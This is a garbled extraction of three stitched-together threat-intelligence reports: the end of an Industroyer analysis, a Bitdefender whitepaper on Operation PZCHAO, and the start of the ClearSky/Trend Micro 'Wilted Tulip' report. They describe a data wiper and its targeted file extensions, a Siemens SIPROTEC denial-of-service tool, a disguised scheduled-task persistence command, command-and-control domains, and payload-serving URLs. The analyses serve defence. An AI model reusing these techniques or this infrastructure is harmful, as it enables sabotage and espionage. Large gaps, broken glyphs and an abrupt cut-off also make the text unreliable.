\n\nfollowing headers:\n\u0141\n \n[*ServerName: %SERVERNAME%] [State: Before]\n\u0141\n \n[*ServerName: %SERVERNAME%] [State: After ON]\n\u0141\n \n[*ServerName: %SERVERNAME%] [State: After OFF]\nData wiper component\nThe data wiper component is a destructive  module that is used in the \u02dcnal \nstage of an attack\n.\n The attackers are using this component to hide their \n\ntracks and to make recovery di\u02dbcult\n.\nThis component has the filename \n or \n and can \nbe executed by the Launcher component or used as a standalone \nmalicious tool\n.\nOnce executed it attempts to enumerate all keys in the registry that list \nWindows services:\n\u0141\n \nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\nIt attempts to set the registry value \nImagePath\n with an empty string in \neach of the entries found\n.\n This operation will make the operating system \nunbootable\n.\nThe next step is actual deletion of \u02dcle contents\n.\n The component \nenumerates \u02dcles with speci\u02dcc \u02dcle extensions on all drives connected to \n\ncomputer, from C:\\ to Z:\\\n.\n It should be noted that during enumeration \n\nthe component skips \u02dcles that are located in subdirectory that contains \n\n in its name\n.\nThe component rewrites \u02dcle content with meaningless data obtained from \n\nnewly allocated memory\n.\n In order to perform this operation thoroughly the \n\ncomponent attempts to rewrite \u02dcles twice\n.\n The \u02dcrst attempt happens once \n\nthe \u02dcle is found on a drive\n.\n If the \u02dcrst attempt is unsuccessful then the wiper \n\nmalware makes a second attempt, but before that the malware terminates \n 14\nall processes except those included in a list of critical system processes\n.\n The \nlist of these processes is displayed in Figure 18\n.\nTo speed up the wiping operation this component rewrites only partial \u02dcle \ncontent at the beginning of the \u02dcle\n.\n The amount of data to be rewritten \n\ndepends on \u02dcle size: the smallest amount of data will be rewritten for \u02dcles \n\nless than or equal to 1Mb (4096 bytes); the largest amount of data will be \n\nrewritten for \u02dcles less than or equal to 10Mb (32768 bytes)\n.\nFinally, this component attempts to terminate all processes (including \nsystem processes) except its own\n.\n This will result in the system becoming \n\nunresponsive and eventually crashing\n.\nFigure 18\n.\n List of processes that are not terminated on second rewriting attempt\n.\nThe \u02dclename masks targeted by the data wiper component to be \n\noverwritten are:\nSYS_BASCON\n.\nCOM\n*\n.\npcmi\n*\n.\nbk\n*\n.\nv\n*\n.\npcmt\n*\n.\nbkp\n*\n.\nPL\n*\n.\nini\n*\n.\nlog\n*\n.\npaf\n*\n.\nxml\n*\n.\nzip\n*\n.\nXRF\n*\n.\nCIN\n*\n.\nrar\n*\n.\ntrc\n*\n.\nprj\n*\n.\ntar\n*\n.\nSCL\n*\n.\ncxm\n*\n.\n7z\n*\n.\nbak\n*\n.\nelb\n*\n.\nexe\n*\n.\ncid\n*\n.\nepl\n*\n.\ndll\n*\n.\nscd\n*\n.\nmdf\n*\n.\npcmp\n*\n.\nldf\nThis list contains \u02dclename extensions that are used in a standard \n\nenvironment, such as Windows binaries (\n.\nexe/\n.\ndll), archives (\n.\n7z /\n.\ntar/\n.\nrar/\n.\n\nzip), backup \u02dcles (\n.\nbak/\n.\nbk/\n.\nbkp), Microsoft SQL server \u02dcles (\n.\nmdf/\n.\nldf), \n\nand various con\u02dcguration \u02dcles (\n.\nini/\n.\nxml)\n.\n In addition, the component also \n\nwipes \u02dcles that may be used in industrial control systems, such as \u02dcles \n\nwritten using \nSubstation Configuration description Language\n (\n.\nscl/\n.\ncid/\n.\nscd) and \n\nthere are many \u02dcles and \u02dcle extensions that are used by various products \n\nfrom ABB\n.\n For example, a \u02dcle named \n is used by ABB \nsolutions for storing con\u02dcguration data, and \u02dcles with the \n \u02dclename extension are used to store license data \nfor ABB MicroSCADA products\n.\nAdditional tools: port scanner tool\nThe attackers\u2122 arsenal includes a port scanner that can be used to map \n\nthe network and to \u02dcnd computers relevant to their attack\n.\n Interestingly, \n\ninstead of using software already existing, the attackers built their own \n\ncustom-made port scanner\n.\n As is evident from Figure 19, the attacker can \nde\u02dcne a range of IP addresses and a range of network ports that are to be \n\nscanned by this tool\n.\nFigure 19\n.\n The port scanner tool usage example\n.\n 15\nAdditional tools: DoS tool\nAnother tool from the attackers\u2122 arsenal is a Denial-of-Service (DoS) tool \nthat can be used against Siemens SIPROTEC devices\n.\n This tool leverages \n\nthe \nCVE-2015-5374\n vulnerability in order to render a device unresponsive\n.\n \n\nOnce this vulnerability is successfully exploited, the target device stops \n\nresponding to any commands until it is rebooted manually\n.\nTo exploit this vulnerability the attackers hardcoded the device IP addresses \ninto this tool\n.\n Once the tool is executed it sends speci\u02dccally crafted packets \n\nto port 50,000 of the target IP addresses using UDP\n.\n The UDP packet \ncontains only 18 bytes\n.\nFigure 20\n.\n Content of UDP packet used during exploitation of CVE-2015-5374\n.\nConclusion\nThe investigation behind the Ukrainian power outage last December is still \n\nongoing and it is currently not con\u02dcrmed that the malware analyzed here \n\nwas the direct cause\n.\n Nevertheless, we believe that to be a very probable \n\nexplanation, as the malware is able to directly control switches and circuit \n\nbreakers at power grid substations using four ICS protocols and contains an \n\nactivation timestamp for December 17, 2016, the day of the power outage\n.\nWe can de\u02dcnitely say that the Win32/Industroyer malware family is an \nadvanced and sophisticated piece of malware that is used against industrial \n\ncontrol systems\n.\n However, it should be noted that the malware itself is just \n\na tool in the hands of an even more advanced and very capable malicious \n\nactor\n.\n Using logs produced by the toolset and highly con\u02dcgurable payloads, \nthe attackers could adapt the malware to any comparable environment\n.\nThe commonly-used industrial control protocols used in this malware \n\nwere designed decades ago without taking security into consideration\n.\n \n\nTherefore, any intrusion into an industrial network with systems using \n\nthese protocols should be considered as \ufb01game over\ufb02\n.\nIndicators of Compromise (IoC)\nSHA-1 hashes:\nF6C21F8189CED6AE150F9EF2E82A3A57843B587D\n\nCCCCE62996D578B984984426A024D9B250237533\n\n8E39ECA1E48240C01EE570631AE8F0C9A9637187\n\n2CB8230281B86FA944D3043AE906016C8B5984D9\n\n79CA89711CDAEDB16B0CCCCFDCFBD6AA7E57120A\n\n94488F214B165512D2FC0438A581F5C9E3BD4D4C\n\n5A5FAFBC3FEC8D36FD57B075EBF34119BA3BFF04\n\nB92149F046F00BB69DE329B8457D32C24726EE00\n\nB335163E6EB854DF5E08E85026B2C3518891EDA8\nIP addresses of C&C servers:\n\n\n\n\nWarning! Most of the servers with these IP addresses were part of Tor \nnetwork which means that the use of these indicators could result in a \n\nfalse positive match\n.\n  ", "Operation PZCHAO\nInside a highly specialized espionage \ninfrastructure\n [\n2\n]\nWhitepaper\nForeword\nMore than 30 years after the end of the Cold War, digital infrastructures worldwide have become strategic national fronts with the same \nimportance as the geographical frontiers of air, land, sea and space.\nAt the same time, cyber-attacks are growing in complexity as threat actors divide payloads in multiple modules with highly specialized \n\ndamaging the targets\u2122 digital \ninfrastructures to stealing highly sensitive data, silently monitoring the victim and constantly laying the ground for a new wave of attacks.\nThis is also the case of a custom-built piece of malware that we have been monitoring for several months as it wrought havoc in Asia. Our \n\nAn interesting feature of this threat, which drew our team to the challenge of analyzing it, is that it features a network of malicious \n\n\n\n\nthe system.\nIn the analysis process, \nwe managed to retrieve the malware payloads hosted on one of the command and control servers along with \nsome statistics, such as the total number of downloads and logs containing the targeted victims. Among the most-downloaded malicious \n\n\nattack infrastructure.\nThis whitepaper takes an in-depth look at the the attack chain, the infrastructure used by the threat actors, the malware subdomains they \n\n1. Victimology\n\n\n\nTechnology\nGovernment\nEducation\nTelecommunications\n [\n3\n]\nWhitepaper\n2. The attack chain\n\ndownloader for further malicious payloads from a distribution server, as shown in the diagram below.\n\n\n\nand executed on the compromised hosts in every stage of attack. \n2.1. Overview of the malware delivery infrastructure\n\n\n\n [\n4\n]\nWhitepaper\n\n\n\n \n\n\n\n\n\n\n\ntemporary folder and serves four main purposes:\n- It renames the second batch script from tnew.bat to win32shell.bat;\n\n\n\n\n\nas well as legit security solutions like 360.;\n [\n]\nWhitepaper\n\n\nschtasks /create /tn \ufb01Adobe Flash Updaters\ufb02 /tr \ufb01%systemroot%\\temp\\win32shell.bat down\ufb02 /sc daily /mo 2  /st 03:00:00  /ru \ufb01\ufb02\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n [\n6\n]\nWhitepaper\n\n\ndiscussed in detail below.\n [\n]\nWhitepaper\n\nThe Bitcoin Miner\n\n\n\n\n\n\n\n\n\n\nis renamed as java.exe and used for bitcoin mining every three weeks at 3 AM.\n\nTo harvest passwords from the target system, the malware deploys two versions of the Mimikatz password-scraping utility for both \n\n\n\n\nserver at a later time.\n\n\n\n\n\n\n\n\n\n\n [\n]\nWhitepaper\nOnce this service is installed on the targeted host, the system is completely compromised, as it has a vast array of espionage capabilities \n\n\n\n\n\n\n\n\n\n\n\nRemote File Downloads\nAbility to download binaries from the Internet to remote host\nRemote Terminal\n\n\n\n\nquite often by malware authors, as it is extremely convenient for attackers to create custom binaries for different targets.\n\n\n\n\n\n\nThe malware then searches inside its own binary for a string delimiter SSSSSSS, returning a string pointer to the beginning of the encrypted \n\n\n\n\n\nIt will then ensure that only one instance of the program runs at a given moment by checking for the presence of a particular mutex on the \nsystem. Subsequently, the payload enables its automatic execution upon every system startup by adding the path of the executable in the \n\n\nIt also registers itself as a system service by adding the following registry keys:\n\n\n\n\n\n\n\n\n\n\n [\n]\nWhitepaper\n\n\n\n\n\n\n\n\nterminate the execution of the application.\n\nup is also written in the current folder.\n \nThe server\u2122s binary  gets extracted from its own resource section and is written to the \\Windows\\System32 folder with the name of the \n\n\n\n\nhost from now on. It starts to communicate with the C2 servers and await instructions.\n\n\n rat.pzchao.com \u0152 used for sending instructions\n\ncenturiosa.info \u0152 used for sending instructions\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextremely useful in determining the importance of the infected target and its potential role on the network.\n [\n]\nWhitepaper\n \n\n\n\n\n\n\nperform an action on a server from a compromised host, a Command packet containing the highlighted capabilities is created and sent. \nAnother trick that helps the malware fly below the radar is to change the C2 address to localhost when the attacker is not using the \ninfrastructure.\n\n\n\n\n\n2. A variable-sized packet that contains the packet payload AES encrypted. \n\nThe client sends small requests - packets containing commands - and the server responds to those commands with the requested data.\n\n\nbyte of the packet payload contains an operation code. There are three types of codes: Commands, Tokens, and Modes. In the source \n\n\nCommand codes are sent by the attacker instructing the victim what to do. Examples:\nCOMMAND_WEBCAM\nCOMMAND_SCREEN_SPY\n\nCOMMAND_KEYBOARD\n [\n]\nWhitepaper\nCOMMAND_AUDIO\nCOMMAND_SCREEN_BLOCK_INPUT\n\nCOMMAND_PSLIST\nToken codes that are passed between the two endpoints to ensure a clear protocol of the data being sent. Examples:\nTOKEN_LOGIN\nTOKEN_DRIVE_LIST\nTOKEN_FILE_LIST\nTOKEN_FIRST_SCREEN\n\nTOKEN_AUDIO_DATA\n\naction settings accordingly. Examples:\nTRANSFER_MODE_NORMAL\nTRANSFER_MODE_UPDATE\n\nTRANSFER_MODE_CANCEL\nAll these capabilities leave no doubt about the tool\u2122s initial purpose and reach into the compromised device. It allows a remote attacker to \n\n3. The malware hosting infrastructure     \n\ndown.pzchao.com \n\n\n\nand the number of hits can be seen in the image below:\n [\n]\nWhitepaper\n\n\n\n\n\nper the graphic below: \n\n\n\n\nrat.pzchao.com. \nWhat differs is that \n\n\ncompressed using zlib. \n\ndll.pzchao.\n\ncom ; 455.pzchao.com. \n\ndll.pzchao.com.\n [\n]\nWhitepaper\n\n\n\n\n\n\nthat this payload is currently undergoing testing.\n\n\n\n\n\n\nConclusions\nEven though the tools used in this particular attack are a few years old, they are battle-tested and more than suitable for future \n\nattacks. The ability to download most of these for free on certain underground hacking forums decreases the cost of attack without \n\ncompromising on stealth or effectiveness. Usually, threat actors are constantly modifying these tools to make them suitable for their \n\ntargets they have in their crosshairs: governments or strategic institutions such as education, telecommunication and so on. \nAs described in this paper, this remote access Torjan\u2122s espionage capabilities and extensive intelligence harvesting from victims turns it \n\n\nthe network level, while the impersonation of legitimate, known applications takes care of the rest.\n [\n]\nWhitepaper\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ndown.pzchao.com\nup.pzchao.com\n\ndll.pzchao.com\n\npzchao.com\n.\nrat.pzchao.com\n\ncenturiosa.info\n\n\nAuthor: \n\n Notes\n \n\nBitdefender is a global security technology company that provides cutting edge end-to-end cyber security solutions and advanced threat protection to more than 500 million users in more than \n150 countries. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a provider of choice in both hybrid infrastructure security \nand endpoint protection. Through R&D, alliances and partnerships, Bitdefender is trusted to be ahead and deliver robust security you can rely on. More information is available at http://www.\nbitdefender.com.\n\u00a9 2018 Bitdefender. All rights reserved. All trademarks, trade names, and products referenced herein are property of their respective owners.\nFOR MORE INFORMATION VISIT: bitdefender.com/business\n ", " \n \n \n \n \nOperation\n \nWilted Tulip\n \n \n \nExposing a cyber espionage apparatus\n \n \nClearSky Cyber Security \n \nTrend Micro\n \nJuly 2017\n \n \n \n  \nPage \n2\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nContents\n \nIntroduction\n \n................................\n................................\n................................\n................................\n..........................\n \n3\n \nTargetting\n \n................................\n................................\n................................\n................................\n.....................\n \n3\n \nMalware\n \n................................\n................................\n................................\n................................\n.......................\n \n3\n \nTargeting\n \n................................\n................................\n................................\n................................\n...............................\n \n4\n \nDelivery and Infection\n \n................................\n................................\n................................\n................................\n..........\n \n5\n \nWateri\nng Hole Attacks\n \n................................\n................................\n................................\n................................\n.....\n \n5\n \nWeb\n-\nBased Exploitation\n \n................................\n................................\n................................\n................................\n...\n \n6\n \nMalicious Documents\n \n................................\n................................\n................................\n................................\n.......\n \n7\n \nExploiting CVE\n-\n2017\n-\n0199\n \n................................\n................................\n................................\n............................\n \n7\n \nEmbedded OLE Objects\n................................\n................................\n................................\n..............................\n11\n \nMalicious Macros\n \n................................\n................................\n................................\n................................\n.......\n15\n \nFake Social Media Entities\n \n................................\n................................\n................................\n..............................\n16\n \nWeb Hacking\n \n................................\n................................\n................................\n................................\n..................\n19\n \nInfrastructure A\nnalysis\n \n................................\n................................\n................................\n................................\n........\n20\n \nDomains\n \n................................\n................................\n................................\n................................\n.........................\n20\n \nIPs\n \n................................\n................................\n................................\n................................\n................................\n...\n24\n \nMalware\n \n................................\n................................\n................................\n................................\n..............................\n27\n \nTDTESS Backdoor\n................................\n................................\n................................\n................................\n............\n27\n \nInstallation and removal\n \n................................\n................................\n................................\n............................\n27\n \nFunctionality\n \n................................\n................................\n................................\n................................\n..............\n29\n \nIndicators of Compromise\n \n................................\n................................\n................................\n.........................\n30\n \nVmin\nst for Lateral Movement\n \n................................\n................................\n................................\n........................\n31\n \nNetSrv \n\n \nCobalt Strike Loader\n \n................................\n................................\n................................\n........................\n32\n \nMatryoshka v1 \n\n \nRAT\n \n................................\n................................\n................................\n................................\n.....\n33\n \nMatreyoshka v2 \n\n \nRAT\n \n................................\n................................\n................................\n................................\n...\n33\n \nZPP \n\n \nFi\nle Compressor\n \n................................\n................................\n................................\n................................\n....\n35\n \nCobalt Strike\n \n................................\n................................\n................................\n................................\n...................\n36\n \nMetasploit\n \n................................\n................................\n................................\n................................\n......................\n37\n \nEmpire Post\n-\nexploitation Framework\n \n................................\n................................\n................................\n............\n38\n \nIndicators of Compromise\n \n................................\n................................\n................................\n................................\n..\n39\n \n \n  \nPage \n3\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIntroduction\n \nCopyKitten\ns\n \nis a\n \ncyberespionage group\n \nthat \nhas been \noperating since at least 201\n3\n. \nIn November \n2015, \nC\nlearSky\n \nand\n \nMinerva Labs\n \npublished\n1\n \nthe \nfirst \npublic\n \nreport \nexpos\ning\n \nits activity\n. \nIn March 2017, \nClearSky\n \npublished a\n \nsecond\n \nreport\n2\n \nexposing further \nincidents\n, some of which impacted the German Bundestag\n. In this \nreport, \nTrend Micro and ClearSky\n \nexpose a vast e\nspionage apparatus spanning the entire time the group has \nbeen active. It includes\n \nrecent incidents as well as older ones that have not been publicly reported\n; new \nmalware\n; \ne\nxploitation, delivery \nand command\n \nand control \ninfrastructure\n; and\n \nthe group's \nmodus operandi.\n \nWe dubbed this activity \nOperation \nW\nilted Tulip\n \n \nTargetting\n \nCopyKittens is an active cyber espionage actor whose primary focus appears to be foreign espionage on \nstrategic targets. Its main targets \nare in\n \ncountries such as Israel, Saudi Arabia, Turkey, The United States, \nJordan, and Germany\n.\n \nOccasionally individuals in other countries are targeted\n \nas well as UN employees\n.\n \nTargeted \norganizations\n \ninclude \ng\novernment institut\nion\ns (\nsuch as \nMinistr\ny\n \nof Foreign \nA\nffairs\n)\n, \na\ncademi\nc \ninstitut\nions\n, \nd\nefense companies, \nm\nunicipal\n \nauthorities\n, sub\n-\ncontractors of the Ministry of Defense\n,\n \nand \nl\narge \nIT companies. Online news outlets and general websites were breached and weaponized as a vehicle for \nwatering\n \nhole attacks.\n \n \nFor\n \nexample, a malicious email was sent from a breached account of an employee in the Ministry of Foreign \nAffairs in the Turkish Republic of Northern Cyprus\n, trying to infect multiple targets in other \ngovernment\n \norgani\nz\nations\n \nworldwide\n.\n \nIn a different case, a\n \ndocument \nlikely \nstolen from the Turkish \nM\ninistry of Foreign \naffairs was used as decoy.\n\nIn other cases,\n \nIsraeli embassies were targeted, as well as foreign embassies in \nIsrael.\n \nVictims are targeted \nby w\natering \nh\nole attacks\n,\n \nand emails with links to\n \nmalicio\nus websites or \nwith \nmalicious \nattachments\n.\n \nFake Facebook profile\ns\n \nhave been used for spreading malicious links and build\ning\n \ntrust with \ntargets. \nSome of the profiles have been active for years.\n \nMalware\n \nCopyKitten\ns\n \nuse \nseveral \nself\n-\ndeveloped \nmalware\n \nand hacking tools\n \nthat have not been publicly reported to \ndate, and are analyzed in this report:\n \nTDTESS\n \nbackdoor\n;\n \nVminst\n,\n \na \nlateral movement\n \ntool; \nNetSrv\n, \na \nCobalt \nStrike \nloader\n;\n \nand\n \nZPP\n, a files compression console program\n.\n \nThe group also use\ns\n \nMatryoshka\n \nv1\n, a self\n-\ndeveloped\n \nRAT analyzed \nby ClearSky \nin \nthe 2015 report\n, and \nMatryoshka v2\n \nwhich is a new version, albeit with \nsimilar functionality\n.\n \nThe group often use\ns\n \nthe trial version of \nCobalt Strike\n3\n,\n \na publicly available commercial software for \"\nAdversary \nSimulations and Red Team Operations\n.\n\"\n \nOther public tools used by the group are\n \nMetasploit\n, a\n \nwell\n-\nknown \nfree and open source framework\n \nfor developing and executing exploit code against a remote target machine\n;\n \nMimikatz\n,\n \na post\n-\nexploitation tool\n \nt\nhat performs credential dumping\n; \nand \nEmpire\n, \"\na PowerShell and Python \npost\n-\nexploitation agent\n.\n\"\n \nFor detection and exploitation of internet\n-\nfacing web servers, CopyKittens use Havij, \nA\ncunetix\n \nand \nsqlmap\n.  \n \nA notable characteristic of \nCopyKittens\n \nis the use \nof DNS \nfor \nc\nommand and \nc\nontrol communication \n(C&C) \nand \nfor data exfiltration.\n \nThis feature is available both in \nCobalt\n \nStrike and in \nMatryoshka\n.\n \nMost of the infrastructure used by the group is in the \nU\n.\nS\n.\n,\n \nRussia\n, and \nT\nhe \nNetherlands. \nSome \nof it ha\ns\n \nbeen \nin use for more \nthan \ntwo\n \nyears.\n \n                                        \n                  \n \n1\n\nwww.clearskysec.com/report\n-\nthe\n-\ncopykittens\n-\nare\n-\ntargeting\n-\nisraelis/\n \n \n2\n\nwww.clearskysec.com/copykitten\n-\njpost/\n \n \n3\n\n \nhttps://www.cobaltstrike.com\n \n \n  \nPage \n4\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nTargeting\n \nB\nased on \nTrend Micro Telemetry, \ni\nncident \nr\nesponse engagement\ns\n, \nand open source \nthreat \nintelligence\n \ninvestigations\n,\n \nwe have learned of \nCopyKittens\n \ntarget organizations and \ncountries\n.\n \nIts main targets are in \ncountrie\ns such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally \nindividuals in other countries are targeted as well as UN employees.\n \nTargeted organizations include government institutions (such as Ministry of Foreign Affairs), \nacademic \ninstitutions, \nd\nefense companies, municipal authorities, sub\n-\ncontractors of the Ministry of Defense, and large \nIT companies. Online news outlets and general websites were breached and weaponized as a vehicle for \nwatering hole attacks.\n \nFor example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign \nAffairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government \norgani\nz\nations\n \nworldwide. In a different case\n, a document likely stolen from the Turkish Ministry of Foreign \naffairs was used as decoy.\n\nIn other cases, Israeli embassies were targeted, as well as foreign embassies in \nIsrael.\n \nBased on the size of the attack infrastructure and length of the campaign, w\ne estimate that there have been \nat least \na \nfew \nhundred \npeople\n \ninfected in \nmultiple\n \norganizations\n \nin the targeted \ncountries\n.\n \nAfter infecting a computer within a target organization, the attacker would move latterly using one of the \nmalware descried in chapt\ner \"Malware\n.\n\" It seems that their objective is to gather as much information and \ndata from target \norganizations as possible\n. They would \nindiscriminately\n \nexfiltrate large amounts of documents, \nspreadsheets, file containing personal data\n, configuration files\n \nand databases. \n \nIn at least one case, the attacker\ns\n \nbreached an IT company, and used VPN access it had to client \norganizations\n \nto\n \nbreach \ntheir\n \nnetworks\n. \n \nOften, victim organizations would learn of the breach due to the non\n-\nstealthy behavior of the attacke\nrs. \nThe \nattackers \nwould \n\"g\ne\nt greedy\n,\n\" infecting \nmultiple\n \ncomputers within the network of breached \norganizations\n. \nThis\n \nwould r\nai\nse an alarm in various defense systems, making the victims \ninitiate\n \nincident response operations.\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n  \nPage \n5\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDelivery and \nInfection\n \n \nCopyKittens attack their t\nargets \nusing\n \nthe following methods\n:\n \n\n \nWatering hole attacks\n \n\n \ninserting\n \nmalicious \nJavaScript\n \ncode into \nbreached \nstrategic websites.\n \n\n \nWeb based exploitation\n \n\n \nemailing\n \nlinks to websites\n \nbuilt by the attackers\n \nand \ncontain\ning\n \nknown \nexploits.\n \n\n \nMalicious documents\n \n\n \nemail attachments containing \nweaponized Microsoft Office documents. \n \n\n \nFake social media entities\n \n\n \nfake personal and organizational \nFacebook \npages are used for interaction \nwith targets and \nfor \ninformation gathering.\n \n\n \nWe\nb hacking\n \n\n \nHavij, Acuntix and \nsqlmap \nare used to detect and exploit \ninternet\n-\nfacing\n \nweb servers.  \n \nThese methods are elaborated below\n.\n \nWatering\n \nH\nole \nA\nttacks\n \nOn 30 March 2017, ClearSky reported a breach of multiple websites, such \nas Jerusalem Post, Maariv\n \nne\nws and \nthe IDF Disabled Veterans Organization website.\n4\n \nJavaScript code was inserted into the breached websites, \nloading BeEF (Browser Exploitation Framework) from domains owned by the attackers\n\n.\n5\n \nFor example:\n \n \nM\nalicious code added to Maariv website\n \nThe malicious code was loaded from one of the following addresses:\n \nhttps://js.j\ng\nuery[.]net/jquery.min.js\n \n \nhttps://js.j\ng\nuery[.]online/\njgueryui.min.js\n \nThis would enable \nthe attackers\n \nto perform \nactions such as \nb\nrowser fingerprinting\n \nand information gathering\n, \ns\nocial \ne\nngineering\n \nattacks\n \n(like a\nsk\ning\n \nfor credentials\n,\n \nr\nedirect to another page\n, asking \nthe user to install \na \nmalicious extension or malware), network reconnaissance, \ninfecting the computer using\n \nMetasploit\n \nexploits, \nand more\n.\n6\n \nThe malicious code was s\nerved \nonly \nwhen specific targets visited the website, likely based on IP \nwhitelisting.\n \nNotably, prior to that publication, \nthe German Federal Office for Information Security (BSI) said in a statement\n \nthat \nit had investigated \"\nproblems in network traffic\n\" of the \nGerman Bundestag\n.\n7\n \nThe statement concluded \nthat \nthe website of Israeli newspaper \nJerusalem Post\n \nwas manipulated and linked to a harmful third party\n \nin \nJanuary 2017\n.\n \n \n                                        \n                  \n \n4\n\nwww.clearskysec.com/copykitten\n-\njpost\n \n5\n\nhttp://beefproject.com\n \n \n6\n\nhttps://github.com/beefproject/beef/wiki\n \n \n7\n\nhttps://www.bsi.bund.de/DE/Presse/Pressemitteilungen/Presse2017/Cyber\n-\nAngriff_auf_den_Bundestag_Stellungnahme_29032017.html\n \n \n  \nPage \n6\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nWeb\n-\nB\nased\n \nE\nxploitation \n \nIn two incidents, the attackers breached the mailbox of a\n \nperson related to\n \na\n \ntarget organization. \nFrom this \n(real) account\n, they \nreplied to \nprevious\n \ncorrespondences with \nthese organizations, adding a malicious link to \na website registered and built by attackers: \nprimemin\nister\n-\ngoverment\n-\ntechcenter\n\n.\n\ntech\n.\n \n8\n \nJava\nScript\n \ncode, at least parts of which were copied from public sources\n, \nfingerprinted the visitor's web \nbrowser.\n9\n \nThis \nwas \nlikely used for later browser exploitation with known vulnerabilities. \n \nIn some pages the code enumerates and collects a list of \ninstalled browser plugins, in others it tries to detect \nthe real IP of the computer:\n \n \nBrowser Plugins enumeration via Java\nS\ncipt code\n \n \nInternal IP \ndetection with Java\n \nThe data is sent to the attackers, and\n \nthe\n \nvictim is redirected to https://akamitechnolo\ngy[.]com/\n.\n \n \nC\nollected data \nsent \nto \nserver\n, then redirecting to new domain\n \n                                        \n                  \n \n8\n\nhttps://blog.domaintools.com/2017/03/hunt\n-\ncase\n-\nstudy\n-\nhunting\n-\ncampaign\n-\nindicators\n-\non\n-\nprivacy\n-\nprotected\n-\nattack\n-\ninfrastr\nucture\n \n \n9\n\nhttps://gist.github.com/kou1okada/2356972\n\n \n  \nPage \n7\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \n \nJavaScript\n \nand \nJava code loaded\n \ninto webpage\n, \nvictim is \nredirected after 20 seconds\n \nMalicious Documents\n \nThe attackers use three document based exploitation types: exploiting \nCVE\n-\n2017\n-\n0199\n, embedding \nOLE\n \nobjects, and macros. If the victim opens a document and the exploitation is successful\n \n(in the latter two, user \ninteraction might be required),\n \nthe attackers would receive access to the computer via self\n-\ndeveloped or \npublicly a\nvailable malware (see \"Malware\" chapter for more details). \n \nExploiting \nCVE\n-\n2017\n-\n0199\n \nOn 26 April 2017, a malicious email was sent from an employee account that was likely breached within the \nMinistry of\n \nNorthern Cyprus. It was sent to a disclosed recipient\ns list in government\n \ninstitutions\n \nin several \ncountries \nand other organizations, most\nly\n \nin or related to ministries of foreign affairs. We \nsh\nould note, \nhowever, that it is \npossible \nthat the attackers were interested only \nin\n \na\n \nfew of the \nrecipient\n \norganizati\nons\n, but \nsent it to a \nwider \nlist \nbecause they \nshowed up in previous \ncorrespondence\ns\n \nin the breached account\n.\n \nRecipients were in the following domains:\n \nmofa.gov.vn\n \nmfa.gov.sg\n \nmfa.gov.tr\n \npost.mfa.uz\n \nmfa.am\n \nmfa.gov.by\n \nbeijing.mfa.gov.il\n \nmofat.go.kr\n \nmfa.no\n \nmofa.go.jp\n \nathens.mfa.gov.il\n \nriga.mfa.sk\n \namfam.com\n \nemfa.pt\n \nmfa.gov.il\n \nmfa.gov.mk\n \nbu.edu\n \nus.mufg.jp\n \ncyburguide.com\n \nnewdelhi.mfa.gov.il\n \nhemofarm.co.yu\n \nmfat.govt.nz\n \nmfa.gr\n \nmfa.gov.lv\n \nmfa.gov.ua\n \nmfa.go.th\n \nmfa.gov.bn\n \nmfa.ee\n \nsbcglobal.net\n \nmfa.is\n \n \n \n \n  \nPage \n8\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nThe email\n \nis\n \npresented below:\n10\n \nRedacted\n \nversion of the malicious email sent form the Ministry of Foreign Affairs in the Turkish Republic of Northern\n \nCyprus\n \nAttached to it was a document named \"IRAN_NORTH\n-\nKOREA_Russia 20170420.docx\"\n.\n11\n \n \nC\nontent of the \nmalicious\n \ndocument\n \nThe document exploited \nCVE\n-\n2017\n-\n0199\n, downloading an rtf file from:\n \nupdate.microsoft\n-\noffice[.]solutions/\nlicense.doc\n \nThe rtf file loads a VBA script from:\n \nhttp://38.130.75[.]20/check.html\n \n \n \n                                        \n                  \n \n10\n\nhttps://www.virus\ntotal.com/en/file/521687de405b2616b1bb690519e993a9fb714cecd488c168a146ff4bbf719f87/analysis/\n \n \n11\n\nhttps://www.virustotal.com/en/file/\n026e9e1cb1a9c2bc0631726cacdb208e704235666042543e766fbd4555bd6950/analysis\n \n \n  \nPage \n9\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nWhich runs a \nC\nobalt \nS\ntrike stager \nthat \ncommunicates with:\n \naaa.stage.14043411.email.sharepoint\n-\nmicrosoft[.]co\n \nIn \nanother\n \ncase\n, \nthe following document \nwas \nuploaded to VirusTotal from Israel\n:\n12\n \n \n\"\nThe North Korean weapons program now testing USA range.docx\n\"\n \n \nContent of the malicious \ndocument\n \nand a prompt that opens w\nhen external link\ns\n \nare \nupdated\n \nI\nt downloads an rtf document\n \nfrom\n:\n \n \nhttp://update.microsoft\n-\noffice[.]solutions/license.doc\n \nThis \ndownloads VBA \ncode \nthat runs a Cobalt Strike stager from the following addresses:\n \nhttp://38.130.75[.]20/error.html\n \nPivoting \nfrom \nupdate.microsoft\n-\noffice\n[\n.\n]\nsolutions\n, we found diagnose\n.microsoft\n-\noffice\n[\n.\n]\nsolutions\n, which \npointed to 5.\n34.181.13. Using \nPassiveTotal\n \nwe found \n40.dc.c0ad.\nip4.dyn.\ngsvr\n-\nstatic[.]co\n. Googling for \ngsvr\n-\nstatic[.]co\n, we found another sample, \ngpupdate.bat\n,\" which \nruns \nP\nower\nS\nhell\n \ncode\n \nthat extracts \na C\nobalt \nS\ntrike \nstager.\n13\n: \n \n \nBase64 encoded 